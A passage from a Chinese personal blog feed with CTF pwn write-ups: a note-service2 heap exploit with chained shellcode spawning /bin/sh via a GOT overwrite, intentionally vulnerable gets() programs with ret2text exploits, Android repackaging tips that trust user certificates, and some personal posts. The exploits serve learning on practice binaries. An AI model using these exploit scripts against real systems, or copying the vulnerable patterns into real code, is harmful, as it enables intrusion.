hex(environ_pointer))</span><br><span class="line">    <span class="comment">#fake_malloc_chunk = main_arena - 60 + 9</span></span><br><span class="line">    <span class="comment"># set memo[0].size = 'a'*8,</span></span><br><span class="line">    <span class="comment"># set memo[0].content point to environ to leak environ addr</span></span><br><span class="line">    fake_pad = <span class="string">'f'</span> * (<span class="number">0x100</span> - <span class="number">0x20</span> - <span class="number">0x10</span>) + <span class="string">'a'</span> * <span class="number">8</span> + p64(</span><br><span class="line">        environ_pointer) + <span class="string">'a'</span> * <span class="number">8</span> + p64(<span class="number">0x602148</span>)</span><br><span class="line">    <span class="comment"># get a fake chunk</span></span><br><span class="line">    add(<span class="number">0x100</span> - <span class="number">8</span>, fake_pad)  <span class="comment"># idx 2</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get environ addr</span></span><br><span class="line">    p.recvuntil(<span class="string">' # CONTENT: '</span>)</span><br><span class="line">    environ_addr = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    environ_addr = u64(environ_addr)</span><br><span class="line">    main_ret_addr = environ_addr - <span class="number">30</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># set memo[0].content point to main_ret_addr</span></span><br><span class="line">    edit(<span class="number">2</span>, p64(main_ret_addr))</span><br><span class="line">    <span class="comment"># overwrite main_ret_addr with one_gadget addr</span></span><br><span class="line">    edit(<span class="number">1</span>, p64(one_gadget_addr))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure><h2 id="2020-3-6"><a href="#2020-3-6" class="headerlink" title="2020-3-6"></a>2020-3-6</h2><h3 id="note-service2"><a href="#note-service2" class="headerlink" title="note-service2"></a>note-service2</h3><h4 id="前言批话"><a href="#前言批话" class="headerlink" title="前言批话"></a>前言批话</h4><p>竟然一个月没上 adworld 了？？以后建个 repo 专门放 pwn，不在这更了。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>题目：adworld – note-service2</p><p>害，我都没看出来这是个啥。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_C07</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"#  ____ _   _ ___  ____ ____ ___  ____ ____ ____ ____ "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"#  |     \\_/  |__] |___ |__/ |__] |___ |__| |    |___ "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"#  |___   |   |__] |___ |  \\ |    |___ |  | |___ |___ "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"#                                                     "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"#  Welcome to CyberPeace note service 2!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"#                                                     "</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是读个数字，choice，最后用了神奇的 atoi 函数，这个函数会略过前面非数字的字母，到 ‘\0’ 转换结束。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_B91</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_B69((__int64)&amp;nptr, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">return</span> atoi(&amp;nptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_AC3</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; a2 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(i + a1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(a1 + i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(i + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = dword_20209C;</span><br><span class="line">  <span class="keyword">if</span> ( dword_20209C &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = dword_20209C;</span><br><span class="line">    <span class="keyword">if</span> ( dword_20209C &lt;= <span class="number">11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">      v1 = sub_B91();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"size:"</span>);</span><br><span class="line">      result = sub_B91();</span><br><span class="line">      v2 = result;</span><br><span class="line">      <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 这个 v1 可以越界，就是任意地址写</span></span><br><span class="line">        qword_2020A0[v1] = <span class="built_in">malloc</span>(result);</span><br><span class="line">        <span class="keyword">if</span> ( !qword_2020A0[v1] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"malloc error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"content:"</span>);</span><br><span class="line">        sub_B69(qword_2020A0[v1], v2);</span><br><span class="line">        result = dword_20209C++ + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST0C_4</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">  v0 = sub_B91();</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_2020A0[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol><li>checksec 发现没有 NX，也就是堆可执行。</li><li>由于一个堆块只能写 7 个字节，所有要跳，把需要的指令写到不同堆块里，每个堆块跳到下一个堆块。</li><li>修改 atoi 的 got 表，触发。</li><li>输入 /bin/sh，香。</li></ol><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context(arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(p, index, sz, cont)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"your choice&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index:"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"size:"</span>, str(sz))</span><br><span class="line">    p.sendafter(<span class="string">"content:"</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(p, index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"your choice&gt;&gt;"</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index:"</span>, str(index))</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./note-service2"</span>)</span><br><span class="line"><span class="comment">#p = remote("111.198.29.45", 43943)</span></span><br><span class="line"></span><br><span class="line">ASM = []</span><br><span class="line">ASM.append(asm(<span class="string">"xor rax,rax"</span>) + <span class="string">b"\x90\x90\xeb\x19"</span>)</span><br><span class="line">ASM.append(asm(<span class="string">"mov eax,0x3b"</span>) + <span class="string">b"\xeb\x19"</span>)</span><br><span class="line">ASM.append(asm(<span class="string">"xor rsi,rsi"</span>) + <span class="string">b"\x90\x90\xed\x19"</span>)</span><br><span class="line">ASM.append(asm(<span class="string">"xor rdx,rdx"</span>) + <span class="string">b"\x90\x90\xed\x19"</span>)</span><br><span class="line">ASM.append(asm(<span class="string">"syscall"</span>) + <span class="string">b"\x90\x90\x90\x90\x90"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">    create(p, i, <span class="number">8</span>, ASM[i])</span><br><span class="line"></span><br><span class="line">delete(p, <span class="number">0</span>)</span><br><span class="line">create(p, <span class="number">-8</span>, <span class="number">8</span>, ASM[<span class="number">0</span>])</span><br><span class="line">p.sendlineafter(<span class="string">"your choice&gt;&gt;"</span>, <span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>但是我 cat flag 的时候跪了啊啊啊啊。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ cat flag</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    <span class="string">'cat flag\n'</span></span><br><span class="line">$ cat flag.txt</span><br><span class="line">[DEBUG] Sent 0xd bytes:</span><br><span class="line">    <span class="string">'cat flag.txt\n'</span></span><br><span class="line">[*] Closed connection to 111.198.29.45 port 43943</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br><span class="line">[*] Stopped process <span class="string">'./note-service2'</span> (pid 4204)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ssj 最近闲的*疼，决定每天写一道 pwn 题（也可能是几道）。&lt;/p&gt;
&lt;h2 id=&quot;2020-1-21&quot;&gt;&lt;a href=&quot;#2020-1-21&quot; class=&quot;headerlink&quot; title=&quot;2020-1-21&quot;&gt;&lt;/a&gt;2020-1-21&lt;/h2&gt;&lt;h3 
      
    
    </summary>
    
    
      <category term="编程" scheme="https://github.com/Cracke-S-J/categories/programming/"/>
    
    
      <category term="pwn" scheme="https://github.com/Cracke-S-J/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>逆向改包 Tips</title>
    <link href="https://github.com/Cracke-S-J/2019/12/01/majiabao/"/>
    <id>https://github.com/Cracke-S-J/2019/12/01/majiabao/</id>
    <published>2019-12-01T03:47:25.000Z</published>
    <updated>2019-12-03T08:32:52.880Z</updated>
    
    <content type="html"><![CDATA[<ol><li>配置网络访问权限及其它权限</li><li>注册Activity</li><li>androidx 有问题可换成 android</li><li>改资源 id</li><li>改类名</li><li>smali/androidx 要复制过去</li></ol><p>开发时遇到问题一是 android 9 以上的网络问题，二是爆栈触发 GC，延迟 30 多秒后起来，网上搜来的代码一定要看一下，直接用有 bug。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">network-security-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">base-config</span> <span class="attr">cleartextTrafficPermitted</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">trust-anchors</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">certificates</span> <span class="attr">src</span>=<span class="string">"system"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">certificates</span> <span class="attr">src</span>=<span class="string">"user"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">trust-anchors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">base-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">network-security-config</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag"><span class="attr">...</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:networkSecurityConfig</span>=<span class="string">"@xml/network_security_config"</span></span></span><br><span class="line"><span class="tag"><span class="attr">...</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##### ssj</span></span><br><span class="line">   <span class="built_in"> new-instance </span>v0, <span class="class">Landroid/content/Intent;</span></span><br><span class="line">   <span class="built_in"> const-class </span>v1, <span class="class">Lcom/ssj/loopviewdemo/LunbotuActivity;</span></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v0, p0, v1&#125;, <span class="class">Landroid/content/Intent;</span>-&gt;&lt;init&gt;(<span class="class">Landroid/content/Context;</span><span class="class">Ljava/lang/Class;</span>)V</span><br><span class="line"><span class="keyword">    .line</span> 15</span><br><span class="line"><span class="keyword">    .local</span> v0, <span class="string">"intent"</span>:<span class="class">Landroid/content/Intent;</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p0, v0&#125;, <span class="class">Lcom/gxswine/new7/MainActivity;</span>-&gt;startActivity(<span class="class">Landroid/content/Intent;</span>)V</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;配置网络访问权限及其它权限&lt;/li&gt;
&lt;li&gt;注册Activity&lt;/li&gt;
&lt;li&gt;androidx 有问题可换成 android&lt;/li&gt;
&lt;li&gt;改资源 id&lt;/li&gt;
&lt;li&gt;改类名&lt;/li&gt;
&lt;li&gt;smali/androidx 要复制过去&lt;/li&gt;

      
    
    </summary>
    
    
      <category term="编程" scheme="https://github.com/Cracke-S-J/categories/programming/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
      <category term="马甲包" scheme="https://github.com/Cracke-S-J/tags/%E9%A9%AC%E7%94%B2%E5%8C%85/"/>
    
  </entry>
  
  <entry>
    <title>人没丢……</title>
    <link href="https://github.com/Cracke-S-J/2019/11/23/people-still-here/"/>
    <id>https://github.com/Cracke-S-J/2019/11/23/people-still-here/</id>
    <published>2019-11-23T12:32:02.000Z</published>
    <updated>2019-11-23T11:51:46.124Z</updated>
    
    <content type="html"><![CDATA[<p>最近人没丢，但也没干啥正事……没啥可写的。</p><p>接下来可能会继续玩 pwn，可能会继续去搞 mjb，可能会留下来做编译器……</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近人没丢，但也没干啥正事……没啥可写的。&lt;/p&gt;
&lt;p&gt;接下来可能会继续玩 pwn，可能会继续去搞 mjb，可能会留下来做编译器……&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="其它" scheme="https://github.com/Cracke-S-J/categories/%E5%85%B6%E5%AE%83/"/>
    
    
      <category term="其它" scheme="https://github.com/Cracke-S-J/tags/%E5%85%B6%E5%AE%83/"/>
    
  </entry>
  
  <entry>
    <title>珠帘寨</title>
    <link href="https://github.com/Cracke-S-J/2019/07/25/zhulianzhai/"/>
    <id>https://github.com/Cracke-S-J/2019/07/25/zhulianzhai/</id>
    <published>2019-07-25T13:25:21.000Z</published>
    <updated>2019-07-25T13:28:57.305Z</updated>
    
    <content type="html"><![CDATA[<p>这部戏只看过准叔版的，当笑话看了哈哈哈哈哈哈哈哈。</p><p>李克用真是个人才，对唐王怀恨在心不发兵，怕老婆，家法严发兵了，遇到周德威出来打架，完虐周德威，射箭老眼昏花看不清，求了一遍神灵，然后射中了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这部戏只看过准叔版的，当笑话看了哈哈哈哈哈哈哈哈。&lt;/p&gt;
&lt;p&gt;李克用真是个人才，对唐王怀恨在心不发兵，怕老婆，家法严发兵了，遇到周德威出来打架，完虐周德威，射箭老眼昏花看不清，求了一遍神灵，然后射中了。&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="听戏" scheme="https://github.com/Cracke-S-J/categories/opera/"/>
    
    
      <category term="京剧" scheme="https://github.com/Cracke-S-J/tags/%E4%BA%AC%E5%89%A7/"/>
    
  </entry>
  
  <entry>
    <title>pwn 入门</title>
    <link href="https://github.com/Cracke-S-J/2019/07/21/pwn1/"/>
    <id>https://github.com/Cracke-S-J/2019/07/21/pwn1/</id>
    <published>2019-07-20T17:21:05.000Z</published>
    <updated>2020-02-20T17:01:58.082Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我用的是 windows 的 ubuntu。</p><h3 id="安装-pwntools"><a href="#安装-pwntools" class="headerlink" title="安装 pwntools"></a>安装 pwntools</h3><p><code>pip install pwntools</code></p><h3 id="64-位-windows-支持-32-位-linux-程序-安装-qemu-amp-binfmt"><a href="#64-位-windows-支持-32-位-linux-程序-安装-qemu-amp-binfmt" class="headerlink" title="64 位 windows 支持 32 位 linux 程序,安装 qemu &amp; binfmt"></a>64 位 windows 支持 32 位 linux 程序,安装 qemu &amp; binfmt</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install qemu-user-static</span><br><span class="line">sudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic '\x7fELF\x01\x01\x01\x03\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x00\x01\x00\x00\x00' --mask '\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xf8\xff\xff\xff\xff\xff\xff\xff'</span><br><span class="line">service binfmt-support start</span><br></pre></td></tr></table></figure><h3 id="关-pie，编译时加-no-pie"><a href="#关-pie，编译时加-no-pie" class="headerlink" title="关 pie，编译时加 -no-pie"></a>关 pie，编译时加 -no-pie</h3><h2 id="0x00-stack-example"><a href="#0x00-stack-example" class="headerlink" title="0x00 stack_example"></a>0x00 stack_example</h2><p>pwn 的 hello world。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You Hava already controlled it."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    vulnerable();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./stack_example'</span>)</span><br><span class="line">success_addr = <span class="number">0x0804843b</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x14</span> + <span class="string">'bbbb'</span> + p32(success_addr)</span><br><span class="line"><span class="keyword">print</span> p32(success_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x01-ret2text"><a href="#0x01-ret2text" class="headerlink" title="0x01 ret2text"></a>0x01 ret2text</h2><p>大致是这样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">secure</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> input; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">    <span class="keyword">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">    v0 = time(<span class="number">0</span>);</span><br><span class="line">    srand(v0);</span><br><span class="line">    secretcode = rand();</span><br><span class="line">    __isoc99_scanf((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_8048760, &amp;input);</span><br><span class="line">    <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"There is something amazing here, do you know anything?"</span>);</span><br><span class="line">    gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Maybe I will tell you next time !"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要注意是相对 esp 索引的。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2text'</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">'A'</span> * (<span class="number">0x6c</span>+<span class="number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x02-ret2shellcode"><a href="#0x02-ret2shellcode" class="headerlink" title="0x02 ret2shellcode"></a>0x02 ret2shellcode</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 